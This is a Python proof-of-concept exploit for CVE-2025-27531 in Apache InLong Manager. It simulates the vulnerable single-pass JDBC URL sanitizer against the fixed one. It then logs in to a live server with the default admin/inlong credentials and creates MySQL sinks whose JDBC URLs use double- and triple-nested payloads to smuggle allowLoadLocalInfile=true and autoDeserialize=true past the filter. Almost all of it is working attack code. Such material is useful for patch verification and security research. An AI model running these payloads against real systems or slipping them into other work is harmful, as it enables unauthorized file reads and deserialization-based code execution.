#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache InLong Manager — Combined Multi-Parameter Bypass + Sanitizer Simulation
# CVE            : CVE-2025-27531
# Vendor         : Apache Software Foundation
# Product        : Apache InLong Manager
# Affected       : 1.13.0 <= version < 2.1.0
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (CRITICAL)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-27531 — Vector 3: Combined Multi-Parameter + Sanitizer Simulation

Part 1: Python simulation of the vulnerable vs fixed sanitizer logic.
Part 2: Live combined multi-parameter and triple-nested bypass tests.

ATTACK CHAIN:
  1. (Local) Simulate single-pass for loop vs iterative while loop
  2. Authenticate as admin/inlong
  3. Inject BOTH allowLoadLocalInfile + autoDeserialize in single URL
  4. Test triple-nested payload depth

PREREQUISITES:
  - Python 3 (stdlib only)

REFERENCES:
  - CVE-2025-27531
  - https://github.com/advisories/GHSA-62gc-8jr5-x9pm
"""

import sys
import json
import http.client
import time
import re


# =============================================================================
# Configuration
# =============================================================================

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8083
CONTEXT_PATH = "/inlong/manager"

USERNAME = "admin"
PASSWORD = "inlong"


# =============================================================================
# Part 1: Python Simulation of the Vulnerable Sanitizer
# =============================================================================

# Sensitive parameters that the sanitizer attempts to remove
SENSITIVE_PARAMS = [
    "autoDeserialize",
    "allowLoadLocalInfile",
    "allowUrlInLocalInfile",
    "allowLoadLocalInfileInPath",
]


def replace_ignore_case(s, old, new):
    """Case-insensitive string replacement (equivalent to StringUtils.replaceIgnoreCase)."""
    pattern = re.compile(re.escape(old), re.IGNORECASE)
    return pattern.sub(new, s)


def filter_sensitive_vulnerable(url):
    """
    VULNERABLE version: Single-pass for loop (v2.0.0 behavior).

    This is the exact logic from MySQLSensitiveUrlUtils.filterSensitive() lines 74-79.
    The for loop iterates once per key, so nested payloads survive.
    """
    result = url
    for key in SENSITIVE_PARAMS:
        result = replace_ignore_case(result, key + "=" + "true", "")
        result = replace_ignore_case(result, key + "=" + "yes", "")
    return result


def contains_sensitive_key(url):
    """Check if URL contains any sensitive key=true or key=yes (case-sensitive, v2.1.0 behavior)."""
    for key in SENSITIVE_PARAMS:
        if (key + "=true") in url or (key + "=yes") in url:
            return key
    return None


def filter_sensitive_fixed(url):
    """
    FIXED version: While loop with iterative removal (v2.1.0 behavior).

    The while loop keeps removing sensitive parameters until none remain,
    defeating the double-write nesting technique.
    """
    result = url
    sensitive_key = contains_sensitive_key(result)
    while sensitive_key:
        result = replace_ignore_case(result, sensitive_key + "=" + "true", "")
        result = replace_ignore_case(result, sensitive_key + "=" + "yes", "")
        sensitive_key = contains_sensitive_key(result)
    return result


def run_sanitizer_simulation():
    """Demonstrate the sanitizer bypass locally using Python simulation."""

    print("=" * 72)
    print("Part 1: Sanitizer Simulation (Python replica of Java code)")
    print("=" * 72)

    test_cases = [
        {
            "name": "allowLoadLocalInfile double-write",
            "input": "jdbc:mysql://address=(host=evil)(port=3306)(allowLoadallowLoadLocalInfile=trueLocalInfile=true)/test",
            "dangerous_param": "allowLoadLocalInfile=true",
        },
        {
            "name": "autoDeserialize double-write",
            "input": "jdbc:mysql://address=(host=evil)(port=3306)(autoDeautoDeserialize=trueserialize=true)/test",
            "dangerous_param": "autoDeserialize=true",
        },
        {
            "name": "allowUrlInLocalInfile double-write",
            "input": "jdbc:mysql://address=(host=evil)(port=3306)(allowUrlInallowUrlInLocalInfile=trueLocalInfile=true)/test",
            "dangerous_param": "allowUrlInLocalInfile=true",
        },
        {
            "name": "Combined: allowLoadLocalInfile + autoDeserialize",
            "input": "jdbc:mysql://address=(host=evil)(port=3306)(allowLoadallowLoadLocalInfile=trueLocalInfile=true)(autoDeautoDeserialize=trueserialize=true)/test",
            "dangerous_param": "allowLoadLocalInfile=true",
        },
        {
            "name": "Triple-nested allowLoadLocalInfile",
            "input": "jdbc:mysql://address=(host=evil)(port=3306)(allowLoadallowLoadallowLoadLocalInfile=trueLocalInfile=trueLocalInfile=true)/test",
            "dangerous_param": "allowLoadLocalInfile=true",
        },
    ]

    all_bypassed = True
    for tc in test_cases:
        print(f"\n--- Test: {tc['name']} ---")
        print(f"  Input:      {tc['input']}")

        vuln_result = filter_sensitive_vulnerable(tc["input"])
        fixed_result = filter_sensitive_fixed(tc["input"])

        vuln_bypassed = tc["dangerous_param"] in vuln_result
        fixed_bypassed = tc["dangerous_param"] in fixed_result

        print(f"  Vulnerable: {vuln_result}")
        print(f"  Fixed:      {fixed_result}")
        print(f"  Bypass (vulnerable v2.0.0): {'YES - DANGEROUS PARAM SURVIVES' if vuln_bypassed else 'No (sanitized)'}")
        print(f"  Bypass (fixed v2.1.0):      {'YES - STILL VULNERABLE' if fixed_bypassed else 'No (properly sanitized)'}")

        if not vuln_bypassed:
            all_bypassed = False

    return all_bypassed


# =============================================================================
# Part 2: Live Combined Multi-Parameter Bypass
# =============================================================================

class InLongClient:
    """Simple InLong Manager API client."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.base_url = f"{CONTEXT_PATH}/api"
        self.session_cookie = None

    def _request(self, method, path, body=None):
        conn = http.client.HTTPConnection(self.host, self.port, timeout=30)
        headers = {"Content-Type": "application/json"}
        if self.session_cookie:
            headers["Cookie"] = self.session_cookie

        url = f"{self.base_url}{path}"
        json_body = json.dumps(body) if body else None

        try:
            conn.request(method, url, body=json_body, headers=headers)
            response = conn.getresponse()

            cookie_header = response.getheader("Set-Cookie")
            if cookie_header and "JSESSIONID=" in cookie_header:
                match = re.search(r'JSESSIONID=([^;]+)', cookie_header)
                if match:
                    self.session_cookie = f"JSESSIONID={match.group(1)}"

            data = response.read().decode("utf-8")
            return json.loads(data) if data else None
        except Exception as e:
            print(f"  [!] Request failed: {e}")
            return None
        finally:
            conn.close()

    def login(self):
        result = self._request("POST", "/anno/login", {
            "username": USERNAME, "password": PASSWORD
        })
        return result and result.get("success")

    def ensure_group_stream(self, group_id, stream_id):
        """Create group and stream if they don't exist."""
        self._request("POST", "/group/save", {
            "inlongGroupId": group_id,
            "mqType": "PULSAR",
            "name": "PoC multi-param test",
            "inCharges": "admin",
        })
        self._request("POST", "/stream/save", {
            "inlongGroupId": group_id,
            "inlongStreamId": stream_id,
            "name": "PoC multi-param stream",
            "dataType": "CSV",
        })

    def create_sink(self, group_id, stream_id, sink_name, jdbc_url):
        result = self._request("POST", "/sink/save", {
            "sinkType": "MYSQL",
            "sinkName": sink_name,
            "inlongGroupId": group_id,
            "inlongStreamId": stream_id,
            "jdbcUrl": jdbc_url,
            "username": "root",
            "password": "test",
            "databaseName": "test",
            "tableName": "test",
        })
        if result and result.get("success"):
            return result.get("data")
        return None

    def get_sink(self, sink_id):
        result = self._request("GET", f"/sink/get/{sink_id}")
        if result and result.get("success"):
            return result.get("data", {}).get("jdbcUrl", "")
        return None


def run_live_combined_test(host, port):
    """Test combined multi-parameter bypass on live InLong Manager."""

    print("\n\n" + "=" * 72)
    print("Part 2: Live Combined Multi-Parameter Bypass Test")
    print("=" * 72)
    print(f"Target: http://{host}:{port}{CONTEXT_PATH}")

    client = InLongClient(host, port)

    if not client.login():
        print("[-] Authentication failed")
        return False

    print("[+] Authenticated successfully")

    group_id = "poc_combined_test"
    stream_id = "poc_combined_stream"
    client.ensure_group_stream(group_id, stream_id)

    timestamp = int(time.time())

    # Test 1: Combined allowLoadLocalInfile + autoDeserialize in single URL
    print("\n--- Test: Combined allowLoadLocalInfile + autoDeserialize bypass ---")
    combined_url = (
        "jdbc:mysql://address=(host=127.0.0.1)(port=3306)"
        "(allowLoadallowLoadLocalInfile=trueLocalInfile=true)"
        "(autoDeautoDeserialize=trueserialize=true)/test"
    )
    print(f"  Input URL: {combined_url}")

    sink_id = client.create_sink(group_id, stream_id, f"poc_combined_{timestamp}", combined_url)
    if sink_id:
        stored = client.get_sink(sink_id)
        print(f"  Stored URL: {stored}")

        has_load = "allowLoadLocalInfile=true" in (stored or "")
        has_deser = "autoDeserialize=true" in (stored or "")
        print(f"  allowLoadLocalInfile=true survived: {'YES' if has_load else 'NO'}")
        print(f"  autoDeserialize=true survived:      {'YES' if has_deser else 'NO'}")

        if has_load and has_deser:
            print("  [+] COMBINED BYPASS CONFIRMED! Both dangerous params survived!")
        elif has_load or has_deser:
            print("  [*] Partial bypass - one parameter survived")
        else:
            print("  [-] No bypass detected")
    else:
        print("  [-] Sink creation failed")
        has_load = has_deser = False

    # Test 2: Triple-nested bypass (testing multi-layer nesting)
    print("\n--- Test: Triple-nested allowLoadLocalInfile bypass ---")
    triple_url = (
        "jdbc:mysql://address=(host=127.0.0.1)(port=3306)"
        "(allowLoadallowLoadallowLoadLocalInfile=trueLocalInfile=trueLocalInfile=true)/test"
    )
    print(f"  Input URL: {triple_url}")

    sink_id2 = client.create_sink(group_id, stream_id, f"poc_triple_{timestamp}", triple_url)
    if sink_id2:
        stored2 = client.get_sink(sink_id2)
        print(f"  Stored URL: {stored2}")

        has_triple = "allowLoadLocalInfile=true" in (stored2 or "")
        print(f"  allowLoadLocalInfile=true survived: {'YES' if has_triple else 'NO'}")
        if has_triple:
            print("  [+] TRIPLE-NESTED BYPASS CONFIRMED!")
            print("  [*] The single-pass sanitizer cannot handle multi-layer nesting")
    else:
        print("  [-] Sink creation failed")
        has_triple = False

    return (has_load and has_deser) or has_triple


def exploit(target_host, target_port):
    """Run combined CVE-2025-27531 verification."""

    # Part 1: Sanitizer simulation
    sim_result = run_sanitizer_simulation()

    # Part 2: Live combined test
    live_result = run_live_combined_test(target_host, target_port)

    # Summary
    print("\n\n" + "=" * 72)
    print("FINAL SUMMARY")
    print("=" * 72)
    print(f"  Sanitizer simulation (Python replica): {'BYPASS CONFIRMED' if sim_result else 'FAILED'}")
    print(f"  Live combined multi-param test:         {'BYPASS CONFIRMED' if live_result else 'FAILED'}")

    if sim_result and live_result:
        print("\n[+] CVE-2025-27531 FULLY CONFIRMED!")
        print("[+] Root cause: single-pass for loop in filterSensitive() allows double-write bypass")
        print("[+] Combined payloads work: attacker can inject MULTIPLE dangerous params at once")
        print("[+] The fixed while-loop approach correctly prevents all bypass variants")
    elif sim_result:
        print("\n[*] Sanitizer logic bypass confirmed via simulation")
    else:
        print("\n[-] Tests did not fully confirm the vulnerability")

    return sim_result and live_result


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    success = exploit(target, port)
    sys.exit(0 if success else 1)
